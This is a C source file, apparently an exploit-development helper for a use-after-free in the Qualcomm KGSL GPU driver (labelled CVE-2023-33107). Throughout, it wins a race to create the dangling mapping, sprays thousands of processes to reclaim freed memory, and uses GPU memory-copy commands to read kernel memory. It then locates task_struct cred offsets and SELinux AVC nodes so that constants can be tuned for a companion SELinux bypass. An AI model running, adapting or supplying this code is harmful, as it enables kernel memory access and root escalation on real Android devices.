#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560
#define AVC_NODE_STRIDE 72
#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
#define AVC_PAGES_PER_IB 12

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1, ph_id = -1;

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    printf("[*] UAF setup: UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static bool phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return false; }
    printf("[+] Race won!\n");
    return true;
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed\n");
}

static void phase4_reclaim(void) {
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
}

static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
    printf("[KILL] spray children killed\n");
}

static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              uint64_t scan_start, uint64_t end_va,
                              uint64_t *out_vas, int maxout) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int n = 0, dw;
    unsigned int ts;
    uint64_t va = scan_start;
    while (va < end_va && n < maxout) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, AVC_PAGES_PER_IB * SCAN_DWORDS * 4);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        int batch = 0;
        for (; batch < AVC_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
            for (int w = 0; w < SCAN_DWORDS; w++) {
                uint32_t dl, dh, sl, sh;
                split64(dst_ga + (batch * SCAN_DWORDS + w) * 4, &dl, &dh);
                split64(va + w * 4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();
        uint64_t pva = va - batch * 0x1000;
        for (int p = 0; p < batch; p++) {
            uint32_t *pd = &data[p * SCAN_DWORDS];
            int found = 0;
            for (int i = 0; i < SCAN_DWORDS - 1 && !found; i++)
                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
            if (found && n < maxout) {
                out_vas[n++] = pva + p * 0x1000;
                printf("[TASK] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
            }
        }
    }
    return n;
}

static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                             void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                             uint64_t *vas, int npages) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int idx = 0, total_nodes = 0;
    unsigned int ts;
    int found_ssid_off = -1, found_tsid_off = -1, found_tclass_off = -1, found_allowed_off = -1;

    while (idx < npages) {
        int batch = npages - idx;
        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, node_dws * 4);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint64_t node_va = va + n * AVC_NODE_STRIDE;
                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
                for (int w = 0; w < 4; w++) {
                    uint32_t dl, dh, sl, sh;
                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
                    split64(node_va + w * 4, &sl, &sh);
                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                    cmd[dw++] = sl; cmd[dw++] = sh;
                }
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();

        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
                uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
                    total_nodes++;
                    printf("[AVC_NODE] va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
                        (unsigned long)va, n*AVC_NODE_STRIDE, ssid, tsid, tclass, allowed);
                    if (found_ssid_off == -1) found_ssid_off = 0;
                    if (found_tsid_off == -1) found_tsid_off = 4;
                    if (found_tclass_off == -1) found_tclass_off = 8;
                    if (found_allowed_off == -1) found_allowed_off = 12;
                }
            }
        }
        idx += batch;
    }

    printf("[AVC] Found %d valid nodes\n", total_nodes);
    if (total_nodes > 0) {
        printf("[AVC] Confirmed offsets: ssid=0x%x tsid=0x%x tclass=0x%x allowed=0x%x\n",
               found_ssid_off, found_tsid_off, found_tclass_off, found_allowed_off);
        printf("[AVC] Node size = %d bytes (expected %d)\n",
               AVC_NODE_STRIDE, AVC_NODE_STRIDE);
    } else {
        printf("[AVC] No valid nodes found. AVC_NODE_STRIDE may be incorrect or cache empty.\n");
    }
    return total_nodes;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] KGSL UAF Analyzer for CVE-2023-33107 porting aid\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 1: rbtree setup\n");
    phase1_rbtree();

    printf("[*] Phase 2: race\n");
    if (!phase2_race()) { close(kgsl_fd); return 1; }

    printf("[*] Phase 3: free UAF\n");
    phase3_free_uaf();

    printf("[*] Phase 4: reclaim\n");
    phase4_reclaim();

    spawn_spray();
    usleep(200000);

    unsigned int ctx_id = create_context();
    printf("[GPU] context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);

    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    uint64_t task_pgs[4096];
    int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
        UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
    printf("[TASK] Found %d task_struct pages\n", n_task);

    if (n_task > 0) {
        uint32_t *data = (uint32_t *)dst_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        int dw = 0;
        uint32_t *cmd = (uint32_t *)ib_m;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i*4, &dl, &dh);
            split64(task_pgs[0] + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            int comm_off = -1;
            for (int i = 0; i < SCAN_DWORDS - 2; i++) {
                if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
                    comm_off = i * 4;
                    break;
                }
            }
            int cred_off = -1;
            for (int i = 0; i < SCAN_DWORDS - 8; i++) {
                int cnt = 0;
                for (int j = 0; j < 8; j++)
                    if (data[i+j] == 0x000007D0) cnt++;
                if (cnt >= 4) { cred_off = i * 4; break; }
            }
            if (comm_off != -1)
                printf("[TASK] comm offset = 0x%x (expected 0x818)\n", comm_off);
            else
                printf("[TASK] comm string not found, offset may differ\n");
            if (cred_off != -1)
                printf("[TASK] cred offset = 0x%x (expected 0x740)\n", cred_off);
            else
                printf("[TASK] cred pattern not found, offset may differ\n");
        }
    }

    printf("[*] Churning to populate AVC cache...\n");
    for (int i = 0; i < 5; i++) {
        int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
        if (fd >= 0) close(fd);
        int dfd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (dfd >= 0) close(dfd);
        usleep(10000);
    }

    uint64_t all_vas[4096];
    int n_all = 0;
    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
        if (n_all < 4096) all_vas[n_all++] = va;
    }
    printf("[AVC] Scanning entire UAF range (%d pages) for avc_node\n", n_all);
    int found = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                  all_vas, n_all);

    if (found == 0) {
        printf("[AVC] No AVC nodes found. More churn or scan range adjustment may be needed.\n");
        printf("[AVC] Please manually verify avc_node structure size and offsets.\n");
    }

    kill_spray_children();
    close(kgsl_fd);
    printf("[*] Analysis complete. Adjust constants in avc_bypass.c based on output.\n");
    return 0;
}
